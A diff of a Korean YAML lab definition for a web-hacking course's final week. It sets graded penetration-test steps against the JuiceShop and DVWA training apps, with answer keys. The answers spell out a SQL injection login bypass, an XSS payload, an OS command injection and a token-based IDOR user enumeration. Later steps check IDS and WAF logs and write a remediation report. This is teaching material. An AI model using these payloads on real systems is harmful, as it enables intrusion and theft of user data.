@@ -1,179 +1,113 @@
 lab_id: "web-vuln-nonai-week15"
-title: "종합 웹 해킹 실습"
+title: "종합 웹 모의해킹 실습"
 version: "non-ai"
 course: "web-vuln-nonai"
 week: 15
-description: "1~14주차 내용을 종합하여 실전 웹 해킹 시나리오를 수행합니다."
+description: "15주 동안 학습한 모든 웹 취약점을 종합하여 JuiceShop과 DVWA에 대한 전체 모의해킹을 수행합니다."
 difficulty: "hard"
-duration_minutes: 120
+duration_minutes: 180
 objectives:
-  - "종합적인 웹 해킹 능력을 검증한다"
-  - "취약점 체인을 구성한다"
-  - "보안 보고서를 작성한다"
+  - "전체 모의해킹 프로세스를 수행한다"
+  - "정보수집부터 공격, 보고서까지 일관된 절차를 실습한다"
+  - "발견한 취약점을 OWASP Top 10에 매핑한다"
 pass_threshold: 0.6
 steps:
   - order: 1
-    instruction: "10.20.30.80 대상으로 대상 정찰 및 정보 수집을(를) 수행하시오."
-    hint: "대상 정찰 및 정보 수집 관련 도구와 기법을 활용하세요."
+    instruction: "JuiceShop(10.20.30.80:3000)에 대한 정보수집을 수행하라. nmap으로 포트 스캔하고, curl로 HTTP 헤더를 분석하라."
+    hint: "nmap -sV 10.20.30.80 -p 80,3000,8080 으로 서비스를 식별하세요."
     category: "recon"
     points: 8
-    answer: "nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '대상 정찰 및 정보 수집 완료'"
-    answer_detail: "대상 정찰 및 정보 수집은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "nmap -sV 10.20.30.80 -p 80,3000,8080 2>/dev/null | grep -E 'open|SERVICE' && echo '---' && curl -sI http://10.20.30.80:3000/ 2>/dev/null | head -10"
+    answer_detail: "모의해킹의 첫 단계는 정보수집입니다. nmap으로 열린 포트와 서비스 버전을 확인하고, HTTP 헤더에서 서버 기술스택(Node.js, Apache, Express)을 파악합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "open"
       field: "stdout"
   - order: 2
-    instruction: "10.20.30.80 대상으로 기술 스택 식별 및 분석을(를) 수행하시오."
-    hint: "기술 스택 식별 및 분석 관련 도구와 기법을 활용하세요."
+    instruction: "nikto로 웹서버의 알려진 취약점을 스캔하라."
+    hint: "nikto -h http://10.20.30.80:3000 -Tuning 1 으로 빠른 스캔하세요."
     category: "recon"
-    points: 10
-    answer: "nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '기술 스택 식별 및 분석 완료'"
-    answer_detail: "기술 스택 식별 및 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    points: 8
+    answer: "nikto -h http://10.20.30.80:3000 -Tuning 1 -maxtime 30s 2>/dev/null | head -20"
+    answer_detail: "nikto는 웹서버의 알려진 취약점, 기본 파일, 디렉토리 등을 자동 점검합니다. 디렉토리 리스팅, 기본 관리 페이지, 오래된 소프트웨어 버전 등을 탐지합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "nikto"
       field: "stdout"
   - order: 3
-    instruction: "10.20.30.80 대상으로 자동 취약점 스캐닝 수행을(를) 수행하시오."
-    hint: "자동 취약점 스캐닝 수행 관련 도구와 기법을 활용하세요."
-    category: "scanning"
-    points: 10
-    answer: "nmap -sV -p 80,443 10.20.30.80 2>/dev/null | head -10 && echo '자동 취약점 스캐닝 수행 완료'"
-    answer_detail: "자동 취약점 스캐닝 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "SQL Injection으로 관리자 인증을 우회하라."
+    hint: "email에 ' or 1=1-- 를 넣으세요."
+    category: "exploit"
+    points: 12
+    answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' or 1=1--\",\"password\":\"x\"}' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('authentication',{}); print(f'Auth bypass: email={d.get(\\\"umail\\\",\\\"?\\\")}, token={d.get(\\\"token\\\",\\\"\\\")[:20]}...')\" 2>/dev/null"
+    answer_detail: "A03:2021 Injection — SQL Injection으로 인증 우회. WHERE 조건이 항상 true가 되어 첫번째 사용자(admin)로 로그인됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "Auth bypass"
       field: "stdout"
   - order: 4
-    instruction: "10.20.30.80 대상으로 SQL Injection 공격 수행을(를) 수행하시오."
-    hint: "SQL Injection 공격 수행 관련 도구와 기법을 활용하세요."
-    category: "sqli"
+    instruction: "XSS를 통해 JuiceShop의 검색 기능에 스크립트를 삽입하라."
+    hint: "/rest/products/search?q= 에 <script> 태그를 넣으세요."
+    category: "exploit"
     points: 10
-    answer: "curl -s 'http://10.20.30.80/rest/products/search?q=test' 2>/dev/null | head -5 && echo 'SQL Injection 공격 수행 완료'"
-    answer_detail: "SQL Injection 공격 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s 'http://10.20.30.80:3000/rest/products/search?q=%3Ciframe%20src%3D%22javascript:alert(1)%22%3E' 2>/dev/null | head -5 && echo '---' && curl -s -o /dev/null -w '%{http_code}' 'http://10.20.30.80/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E' && echo ' (WAF check)'"
+    answer_detail: "A03:2021 Injection — Reflected XSS. 검색어가 응답에 그대로 반영되면 사용자 브라우저에서 스크립트가 실행됩니다. modsecurity가 포트 80에서는 차단합니다."
     verify:
-      type: "output_contains"
-      expect: "완료"
+      type: "output_regex"
+      expect: "iframe|403|script"
       field: "stdout"
   - order: 5
-    instruction: "10.20.30.80 대상으로 XSS 공격 수행을(를) 수행하시오."
-    hint: "XSS 공격 수행 관련 도구와 기법을 활용하세요."
-    category: "xss"
+    instruction: "DVWA에서 Command Injection으로 서버 정보를 수집하라."
+    hint: "ip=|+uname+-a 형태로 시스템 정보를 확인하세요."
+    category: "exploit"
     points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'XSS 공격 수행 완료'"
-    answer_detail: "XSS 공격 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s -b 'PHPSESSID=test;security=low' -d 'ip=|+uname+-a&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/ 2>/dev/null | grep -i 'linux' | head -3"
+    answer_detail: "A03:2021 Injection — OS Command Injection. 파이프(|)로 시스템 명령을 실행하여 커널 버전, 아키텍처 등을 수집합니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "Linux"
       field: "stdout"
   - order: 6
-    instruction: "10.20.30.80 대상으로 인증 우회 공격 수행을(를) 수행하시오."
-    hint: "인증 우회 공격 수행 관련 도구와 기법을 활용하세요."
-    category: "auth"
-    points: 12
-    answer: "curl -s -X POST http://10.20.30.80/rest/user/login -H 'Content-Type: application/json' -d '{}' 2>/dev/null | head -5 && echo '인증 우회 공격 수행 완료'"
-    answer_detail: "인증 우회 공격 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    instruction: "IDOR로 다른 사용자의 데이터에 접근하라. /api/Users/1 ~ /api/Users/5를 열거하라."
+    hint: "인증 토큰과 함께 /api/Users/{id}를 순회하세요."
+    category: "exploit"
+    points: 10
+    answer: "TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' or 1=1--\",\"password\":\"x\"}' 2>/dev/null | python3 -c \"import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))\" 2>/dev/null) && for i in 1 2 3; do curl -s http://10.20.30.80:3000/api/Users/$i -H \"Authorization: Bearer $TOKEN\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'User {$i}: {d.get(\\\"email\\\",\\\"?\\\")}')\" 2>/dev/null; done"
+    answer_detail: "A01:2021 Broken Access Control — IDOR로 다른 사용자의 개인정보에 접근합니다. 서버가 리소스 소유권을 검증하지 않으면 모든 사용자 정보가 유출됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "User"
       field: "stdout"
   - order: 7
-    instruction: "10.20.30.80 대상으로 파일 업로드 공격 수행을(를) 수행하시오."
-    hint: "파일 업로드 공격 수행 관련 도구와 기법을 활용하세요."
-    category: "upload"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '파일 업로드 공격 수행 완료'"
-    answer_detail: "파일 업로드 공격 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 8
-    instruction: "10.20.30.80 대상으로 SSRF/IDOR 취약점 탐색을(를) 수행하시오."
-    hint: "SSRF/IDOR 취약점 탐색 관련 도구와 기법을 활용하세요."
-    category: "ssrf"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'SSRF/IDOR 취약점 탐색 완료'"
-    answer_detail: "SSRF/IDOR 취약점 탐색은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 9
-    instruction: "10.20.30.80 대상으로 권한 상승 시도을(를) 수행하시오."
-    hint: "권한 상승 시도 관련 도구와 기법을 활용하세요."
-    category: "privesc"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '권한 상승 시도 완료'"
-    answer_detail: "권한 상승 시도은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 10
-    instruction: "10.20.30.80 대상으로 민감 데이터 추출을(를) 수행하시오."
-    hint: "민감 데이터 추출 관련 도구와 기법을 활용하세요."
-    category: "exfil"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '민감 데이터 추출 완료'"
-    answer_detail: "민감 데이터 추출은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 11
-    instruction: "10.20.30.80 대상으로 취약점 체인 구성 및 시연을(를) 수행하시오."
-    hint: "취약점 체인 구성 및 시연 관련 도구와 기법을 활용하세요."
-    category: "chain"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '취약점 체인 구성 및 시연 완료'"
-    answer_detail: "취약점 체인 구성 및 시연은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 12
-    instruction: "10.20.30.80 대상으로 위험도 평가 수행을(를) 수행하시오."
-    hint: "위험도 평가 수행 관련 도구와 기법을 활용하세요."
-    category: "assessment"
-    points: 10
-    answer: "curl -s http://10.20.30.80 2>/dev/null | head -5 && echo '위험도 평가 수행 완료'"
-    answer_detail: "위험도 평가 수행은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 13
-    instruction: "10.20.30.80 대상으로 방어 권고안 작성을(를) 수행하시오."
-    hint: "방어 권고안 작성 관련 도구와 기법을 활용하세요."
+    instruction: "suricata가 모의해킹 활동을 탐지했는지 확인하라. SECU VM(10.20.30.1)의 suricata 로그를 확인하라."
+    hint: "SubAgent로 secu의 /var/log/suricata/eve.json에서 alert를 검색하세요."
     category: "defense"
     points: 10
-    answer: "echo '=== 방어 권고안 작성 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "방어 권고안 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
+    answer: "curl -s -X POST http://10.20.30.1:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"tail -50 /var/log/suricata/eve.json 2>/dev/null | grep -c alert; echo \\\" alerts in last 50 lines\\\"\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
+    answer_detail: "Suricata IDS는 네트워크 트래픽을 실시간 분석하여 SQLi, XSS, 포트 스캔 등의 공격 시그니처를 탐지합니다. eve.json의 alert 이벤트에 탐지 내역이 기록됩니다."
     verify:
       type: "output_contains"
-      expect: "완료"
+      expect: "alerts"
       field: "stdout"
-  - order: 14
-    instruction: "10.20.30.80 대상으로 경영진 요약 보고 작성을(를) 수행하시오."
-    hint: "경영진 요약 보고 작성 관련 도구와 기법을 활용하세요."
-    category: "reporting"
-    points: 12
-    answer: "echo '=== 경영진 요약 보고 작성 ===' && echo '조치 방안 정리 완료'"
-    answer_detail: "경영진 요약 보고 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다."
-    verify:
-      type: "output_contains"
-      expect: "완료"
-      field: "stdout"
-  - order: 15
-    instruction: "종합 웹 해킹 실습 종합 보고서를 작성하시오."
-    hint: "발견 취약점, 영향, 조치를 포함하세요."
-    category: "verification"
+  - order: 8
+    instruction: "modsecurity의 차단 통계를 확인하라. 웹서버의 error.log에서 ModSecurity 차단 건수를 집계하라."
+    hint: "SubAgent로 grep -c 'ModSecurity: Access denied' /var/log/apache2/error.log를 실행하세요."
+    category: "defense"
     points: 8
-    answer: "echo '=== 종합 웹 해킹 실습 보고서 ===' && echo '대상: http://10.20.30.80' && echo '=== 보고서 완료 ==='"
-    answer_detail: "취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다."
+    answer: "curl -s -X POST http://10.20.30.80:8002/a2a/run_script -H 'Content-Type: application/json' -d '{\"script\":\"echo \\\"ModSecurity blocks: $(grep -c \\\\\"Access denied\\\\\" /var/log/apache2/error.log 2>/dev/null || echo 0)\\\" && echo \\\"Top blocked rules:\" && grep \\\\\"id \\\\\\\\\\\"9\\\\\" /var/log/apache2/error.log 2>/dev/null | grep -oP \\\\\"id \\\\\\\\\\\"\\\\d+\\\\\" | sort | uniq -c | sort -rn | head -5\"}' | python3 -c \"import sys,json; print(json.load(sys.stdin).get('stdout',''))\""
+    answer_detail: "modsecurity 로그에서 차단 건수와 가장 많이 매칭된 룰 ID를 분석하면 어떤 공격 유형이 가장 많은지 파악할 수 있습니다. 이 데이터는 WAF 튜닝에 활용됩니다."
     verify:
       type: "output_contains"
-      expect: "보고서 완료"
+      expect: "ModSecurity blocks"
+      field: "stdout"
+  - order: 9
+    instruction: "종합 모의해킹 보고서를 /tmp/pentest_report.txt에 작성하라. OWASP Top 10 매핑을 포함하라."
+    hint: "발견한 각 취약점을 A01~A10에 매핑하세요."
+    category: "reporting"
+    points: 10
+    answer: "cat > /tmp/pentest_report.txt << 'EOF'\n=== 종합 웹 모의해킹 보고서 ===\n대상: 10.20.30.80 (JuiceShop:3000, DVWA:8080, Apache:80)\n일자: $(date +%Y-%m-%d)\n\n[정보수집]\n- 오픈 포트: 80(Apache+modsecurity), 3000(JuiceShop), 8080(DVWA)\n- 서버: Node.js(Express), Apache 2.4, PHP(DVWA)\n\n[발견 취약점 — OWASP Top 10 매핑]\nA01 Broken Access Control: IDOR (/api/Users, /rest/basket)\nA03 Injection: SQLi (인증 우회), XSS (검색), Command Injection (DVWA)\nA05 Security Misconfiguration: 디렉토리 리스팅(/ftp/), API 문서 노출\nA07 Authentication Failures: Brute Force, 보안 질문 약점\n\n[방어 현황]\n- modsecurity CRS: SQLi/XSS/CMDi 차단 정상\n- Suricata IDS: 네트워크 레벨 탐지 정상\n\n[권고]\n- Prepared Statement 적용 (SQLi 방어)\n- 입력 검증 + 출력 인코딩 (XSS 방어)\n- RBAC + 소유권 검증 (IDOR 방어)\n- Rate Limiting + MFA (인증 강화)\nEOF\ncat /tmp/pentest_report.txt"
+    answer_detail: "모의해킹 보고서는 정보수집→취약점 발견→영향 분석→방어 권고 순서로 작성합니다. OWASP Top 10에 매핑하면 경영진이 이해하기 쉽고, 업계 표준 프레임워크에 맞출 수 있습니다."
+    verify:
+      type: "output_contains"
+      expect: "종합 웹 모의해킹 보고서"
       field: "stdout"
